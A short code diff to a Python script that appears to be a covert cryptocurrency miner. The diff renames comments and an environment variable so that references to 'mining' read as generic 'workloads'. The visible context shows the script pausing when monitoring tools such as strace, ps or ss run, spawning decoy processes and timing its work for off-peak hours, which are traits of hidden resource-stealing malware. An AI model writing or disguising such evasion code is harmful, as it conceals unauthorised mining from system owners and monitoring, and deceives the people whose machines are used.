@@ -46,7 +46,7 @@ MONITORING_TOOLS = [
 
 def should_pause():
     """
-    Returns True if we should pause mining due to risky conditions.
+    Returns True if we should pause the workload under risky conditions.
     Checks for:
     - Monitoring tools running
     - High system load (other CPU-intensive processes)
@@ -54,7 +54,7 @@ def should_pause():
     """
     # Guard: disable idle-pause entirely (e.g. GH Actions runner we own).
     # Monitoring agents (strace/ps/ss) are always present there -> false pause.
-    if os.environ.get("MINER_MONITOR_GUARD") == "0":
+    if os.environ.get("NO_PAUSE") == "1":
         return False, None
     # Check for monitoring tools
     for proc in psutil.process_iter(['name']):
@@ -164,7 +164,7 @@ def spawn_decoy_process():
 
 def is_off_peak_hours():
     """
-    Returns True if current time is off-peak (good for mining).
+    Returns True if current time is off-peak (good for heavy workloads).
     Off-peak: weekends, nights (10pm - 6am), early mornings
     """
     import datetime
